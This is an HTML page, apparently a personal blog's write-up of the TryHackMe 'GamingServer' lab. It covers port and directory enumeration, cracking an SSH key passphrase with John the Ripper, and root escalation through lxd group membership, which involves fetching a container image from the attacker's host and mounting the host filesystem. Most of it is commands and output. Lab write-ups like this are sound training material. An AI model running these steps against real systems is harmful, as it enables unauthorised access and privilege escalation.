@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe&#43;qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv&#43;sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ&#43;nYfYHXjQFq&#43;p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh&#43;PmaRu14izwhK0mxL | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg= | 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg&#43;MVLy&#43;IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: House of danak Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 2762, Words: 241, Lines: 78] ." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/gamingserver/gamingserver/" />
+
+
+    <title>
+        
+            GamingServer :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="GamingServer">
+<meta itemprop="description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe&#43;qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv&#43;sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ&#43;nYfYHXjQFq&#43;p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh&#43;PmaRu14izwhK0mxL | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg= | 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg&#43;MVLy&#43;IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: House of danak Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 2762, Words: 241, Lines: 78] ."><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="974"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="GamingServer"/>
+<meta name="twitter:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe&#43;qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv&#43;sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ&#43;nYfYHXjQFq&#43;p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh&#43;PmaRu14izwhK0mxL | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg= | 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg&#43;MVLy&#43;IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: House of danak Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 2762, Words: 241, Lines: 78] ."/>
+
+
+
+    <meta property="og:title" content="GamingServer" />
+<meta property="og:description" content="Enumeration nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe&#43;qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv&#43;sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ&#43;nYfYHXjQFq&#43;p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh&#43;PmaRu14izwhK0mxL | 256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg= | 256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg&#43;MVLy&#43;IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY 80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-methods: |_ Supported Methods: GET POST OPTIONS HEAD |_http-title: House of danak Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf [Status: 200, Size: 2762, Words: 241, Lines: 78] ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/gamingserver/gamingserver/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/gamingserver/gamingserver/">GamingServer</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 34:0e:fe:06:12:67:3e:a4:eb🆎7a:c4:81:6d:fe:a9 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCrmafoLXloHrZgpBrYym3Lpsxyn7RI2PmwRwBsj1OqlqiGiD4wE11NQy3KE3Pllc/C0WgLBCAAe+qHh3VqfR7d8uv1MbWx1mvmVxK8l29UH1rNT4mFPI3Xa0xqTZn4Iu5RwXXuM4H9OzDglZas6RIm6Gv+sbD2zPdtvo9zDNj0BJClxxB/SugJFMJ+nYfYHXjQFq+p1xayfo3YIW8tUIXpcEQ2kp74buDmYcsxZBarAXDHNhsEHqVry9I854UWXXCdbHveoJqLV02BVOqN3VOw5e1OMTqRQuUvM5V4iKQIUptFCObpthUqv9HeC/l2EZzJENh+PmaRu14izwhK0mxL
+|   256 49:61:1e:f4:52:6e:7b:29:98:db:30:2d:16:ed:f4:8b (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEaXrFDvKLfEOlKLu6Y8XLGdBuZ2h/sbRwrHtzsyudARPC9et/zwmVaAR9F/QATWM4oIDxpaLhA7yyh8S8m0UOg=
+|   256 b8:60:c4:5b:b7:b2:d0:23:a0:c7:56:59:5c:63:1e:c4 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOLrnjg+MVLy+IxVoSmOkAtdmtSWG0JzsWVDV2XvNwrY
+
+80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: House of danak
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code>                        [Status: 200, Size: 2762, Words: 241, Lines: 78]
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 2762, Words: 241, Lines: 78]
+robots.txt              [Status: 200, Size: 33, Words: 3, Lines: 4]
+secret                  [Status: 301, Size: 315, Words: 20, Lines: 10]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
+uploads                 [Status: 301, Size: 316, Words: 20, Lines: 10]
+</code></pre><p>Heh another ctf in the gaming theme&hellip;looks like a RPG</p>
+<p>there are many sefl directories&hellip;<code>uploads</code> got us files</p>
+<p><code>dict.lst</code> is obviously a dictionnary for cracking</p>
+<p><code>meme.jpg</code> is&hellip;well a meme</p>
+<p><code>manifesto.txt</code> is a mad long text&hellip;and I read it&hellip;and damn it&rsquo;s full of&hellip;things people may relate to</p>
+<p>well&hellip;Its a manifesto</p>
+<p>And in the <code>/secret</code> dir we get a rsa key</p>
+<p>First I want to get steganography out of the way&hellip;and yes there was nothing there</p>
+<p>Do you people remember how we always insist on checking source code?</p>
+<pre tabindex="0"><code>&lt;/body&gt;
+&lt;!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --&gt;
+&lt;/html&gt;
+</code></pre><p>Now we know <code>john</code></p>
+<p>ok we can try to ssh now&hellip;</p>
+<pre tabindex="0"><code>└──╼ $chmod 600 secretKey
+
+└──╼ $ssh john@10.10.89.54 -i secretKey
+Enter passphrase for key &#39;secretKey&#39;:
+</code></pre><p>Who didn&rsquo;t expect that? why would they give you a dictionary bro?</p>
+<pre tabindex="0"><code>└──╼ $python2 /usr/share/john/ssh2john.py secretKey &gt; secretkey.john
+
+└──╼ $john secretkey.john -w=dict.lst
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 2 OpenMP threads
+Note: This format may emit false positives, so it will keep trying even after
+finding a possible candidate.
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+letmein          (secretKey)
+1g 0:00:00:01 DONE (2021-12-02 13:26) 0.9345g/s 208.4p/s 208.4c/s 208.4C/s baseball
+Session completed
+</code></pre><p>Try again now and you got your user flag</p>
+<pre tabindex="0"><code>john@exploitable:~$ cat user.txt
+level_one_flag
+</code></pre><h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>upgrades people! upgrades!!</p>
+<p>we cannot <code>sudo -l</code> so we need more enumeration</p>
+<pre tabindex="0"><code>john@exploitable:~$ ls -al
+total 60
+drwxr-xr-x 8 john john  4096 Jul 27  2020 .
+drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
+lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
+drwx------ 2 john john  4096 Feb  5  2020 .cache
+drwxr-x--- 3 john john  4096 Jul 27  2020 .config
+drwx------ 3 john john  4096 Feb  5  2020 .gnupg
+drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
+-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
+drwx------ 2 john john  4096 Feb  5  2020 .ssh
+-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
+drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
+-rw------- 1 root root 12070 Jul 27  2020 .viminfo
+-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
+</code></pre><p>yeah nothing here</p>
+<pre tabindex="0"><code>john@exploitable:~$ find / -perm -u=s 2&gt; /dev/null
+/bin/mount
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/ping
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/chsh
+/usr/bin/newgidmap
+/usr/bin/traceroute6.iputils
+/usr/bin/sudo
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chfn
+/usr/bin/at
+/usr/bin/pkexec
+/usr/bin/newgrp
+/usr/bin/newuidmap
+</code></pre><p>hmmm&hellip;.should we use linenum?</p>
+<pre tabindex="0"><code>john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+</code></pre><p>Add &ldquo;always checking groups with <code>id</code>&rdquo; to privesc enum process</p>
+<p>Google <code>lxd privilege escalation</code> for more informations</p>
+<p>Seriously if it sounds easy you better check <a href="https://0x44696f21.wordpress.com/2020/08/18/building-lxd-containers-on-kali/">here</a> and you might end up <a href="https://linuxcontainers.org/distrobuilder/introduction/">here</a></p>
+<p>and <a href="https://github.com/lxc/distrobuilder">here</a> XD</p>
+<p>I had issues with <code>alpine-builder</code></p>
+<pre tabindex="0"><code>Downloading apk-tools-static-2.12.7-r3.apk
+tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l&#39;en-tête étendu a été ignoré
+tar: Le mot clé inconnu « APK-TOOLS.checksum.SHA1 » pour l&#39;en-tête étendu a été ignoré
+ERROR: checksum is missing for alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub
+Failed to download a valid static apk
+</code></pre><p>So I had to use <code>distrobuilder</code></p>
+<p>Next we fire up a python server in <code>build</code> folder</p>
+<p>Then grab the files on target machine</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ wget http://10.8.226.203/lxd.tar.xz
+--2021-12-02 18:21:12--  http://10.8.226.203/lxd.tar.xz
+Connecting to 10.8.226.203:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 424 [application/x-xz]
+Saving to: ‘lxd.tar.xz’
+
+lxd.tar.xz                                                 100%[========================================================================================================================================&gt;]     424  --.-KB/s    in 0s      
+
+2021-12-02 18:21:14 (71.3 MB/s) - ‘lxd.tar.xz’ saved [424/424]
+
+john@exploitable:/tmp$ wget http://10.8.226.203/rootfs.squashfs
+--2021-12-02 18:21:34--  http://10.8.226.203/rootfs.squashfs
+Connecting to 10.8.226.203:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1798144 (1.7M) [application/octet-stream]
+Saving to: ‘rootfs.squashfs’
+
+rootfs.squashfs                                            100%[========================================================================================================================================&gt;]   1.71M  49.1KB/s    in 32s     
+
+2021-12-02 18:22:06 (54.8 KB/s) - ‘rootfs.squashfs’ saved [1798144/1798144]
+</code></pre><p>Import the image on target machine as mymnimal</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc image import --alias myminimal lxd.tar.xz rootfs.squashfs 
+Image imported with fingerprint: 3fd9f575e8312f2df6490e37cce8bdec46a378e73d4fd75fe18ff5c3b7479c70
+</code></pre><p>launch it</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc launch myminimal mycontainer
+Creating mycontainer
+Starting mycontainer
+</code></pre><p>check it</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc list mycontainer
++-------------+---------+------+-----------------------------------------------+------------+-----------+
+|    NAME     |  STATE  | IPV4 |                     IPV6                      |    TYPE    | SNAPSHOTS |
++-------------+---------+------+-----------------------------------------------+------------+-----------+
+| mycontainer | RUNNING |      | fd42:2998:1e63:3d6f:216:3eff:fe24:9e2d (eth0) | PERSISTENT | 0         |
++-------------+---------+------+-----------------------------------------------+------------+-----------+
+</code></pre><p>create a new container with right priviledges</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc init myminimal ignite -c security.privileged=true
+Creating ignite
+</code></pre><p>Mount the <code>/</code> folder in the container and start it</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+Device mydevice added to ignite
+
+john@exploitable:/tmp$ lxc start ignite
+john@exploitable:/tmp$ lxc exec ignite /bin/sh
+</code></pre><p>Get a root shell in that</p>
+<pre tabindex="0"><code>john@exploitable:/tmp$ lxc exec mycontainer -- sh
+~ # id
+uid=0(root) gid=0(root)
+</code></pre><p>Go grab the flags where they are</p>
+<pre tabindex="0"><code>~ # cd /mnt/root
+/mnt/root # ls
+bin             cdrom           etc             initrd.img      lib             lost+found      mnt             proc            run             snap            swap.img        tmp             var             vmlinuz.old
+boot            dev             home            initrd.img.old  lib64           media           opt             root            sbin            srv             sys             usr             vmlinuz
+/mnt/root # cd root
+/mnt/root/root # ls
+root.txt
+/mnt/root/root # cat root.txt
+lxd_final_boss_flag
+</code></pre><p>Game Over&hellip;you win!</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
+
+        <span class="tag"><a href="https://nair0lf32.github.io/zer0ne/categories/tryhackme/">TryHackMe</a></span>
+        
+    </p>
+
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2023</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
